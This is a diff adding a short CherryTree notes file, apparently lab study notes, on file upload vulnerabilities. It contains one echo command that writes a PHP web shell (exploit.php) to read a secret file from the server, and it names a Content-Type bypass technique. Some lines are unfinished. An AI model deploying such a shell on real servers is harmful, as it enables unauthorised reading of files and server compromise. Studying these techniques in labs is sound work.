@@ -1,0 +1,14 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node name="File upload vulnarabilitíes" unique_id="12" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1715336438" ts_lastsave="1715339260">
+    <rich_text>1. </rich_text>
+    <rich_text scale="h2">Exploiting unrestricted file uploads to deploy a web shell</rich_text>
+    <rich_text>
+   a.  for getting secret value in file path with given exploit through uplading a file
+      1- echo "&lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt;" &gt; exploit.php
+	b. When uploading large content like a from, using content-mult
+2. Web shell upload via Content-Type restriction bypass
+	a. 
+</rich_text>
+  </node>
+</cherrytree>
